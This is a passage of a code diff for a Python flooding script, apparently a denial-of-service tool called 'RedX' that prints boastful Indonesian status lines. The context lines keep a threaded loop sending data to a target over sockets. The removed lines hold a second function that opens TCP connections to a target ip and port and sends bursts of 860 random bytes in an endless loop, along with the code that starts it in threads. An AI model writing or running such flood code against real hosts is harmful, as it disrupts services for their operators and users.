@@ -42,29 +42,11 @@ def run():
                                 s.sendto(data,addr)
                         print("\033[92m [*] RedX Menyenggol ")
                 except:
-                        print("\033[92m [!] RedX IS HERE DUDE! ")
-
-def run2():
-        data = random._urandom(860)
-        i = random.choice(("[*]","[!]","[#]"))
-        while True:
-                try:
-                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                        s.connect((ip,port))
-                        s.send(data)
-                        for x in range(times):
-                                s.send(data)
-                        print("\033[92m [!] RedX Menyenggol ")
-                except:
-                        s.close()
-                        print("\033[92m [*] RedX IS HERE DUDE ")
+                        print("\033[94m [!] RedX IS HERE DUDE! ")
 
 for y in range(threads):
         if choice == 'y':
                 th = threading.Thread(target = run)
-                th.start()
-        if choice == 'y':
-                th = threading.Thread(target = run2)
                 th.start()
         
 else:
